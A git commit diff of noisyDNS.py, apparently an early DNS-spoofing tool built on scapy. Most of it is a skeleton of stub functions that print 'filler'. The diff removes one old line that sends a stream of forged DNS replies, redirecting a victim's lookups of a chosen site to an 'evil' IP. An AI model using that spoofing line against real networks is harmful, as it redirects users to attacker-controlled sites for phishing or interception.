0f467835e23dca46c0f10a69796b46487ef84b7a
root <root@localhost.localdomain>
2015-01-26 07:23:35 -0500

    still refactoring

--- noisyDNS.py
+++ noisyDNS.py
@@ -2,13 +2,31 @@
 from scapy.all import *
 import argparse
 
+'''
 parser = argparse.ArgumentParser()
 parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
 parser.add_argument("evilIP", help="IP of evil website")
 parser.add_argument("dnsserver", help="spoofed DNS server")
 parser.add_argument("target", help="your target")
 args = parser.parse_args()
+'''
+
+#sniff the traffic for at least a minute to try to capture DNS server
+def sniff_dns():
+	print "filler"
+
+#spam client with DNS replies
+def spam_replies():
+	print "filler"
+
+#sit and wait for DNS requests and try to reply first
+def surgical_strike():
+	print "filler"
+
+def main():
+	#Args -w <website>, -e <IP of site to redirect user>, -d <DNS Server if known>
+	# -t <target>, -n <noisy>
 
 
-#old code
-#send(IP(src=args.dnsserver, dst=args.target)/UDP(sport=53, dport=53)/DNS(an=DNSRR(rrname=args.targetsite, rdata=args.evilIP)), loop=1, inter=.5)
+if __name__=="__main__":
+	main()
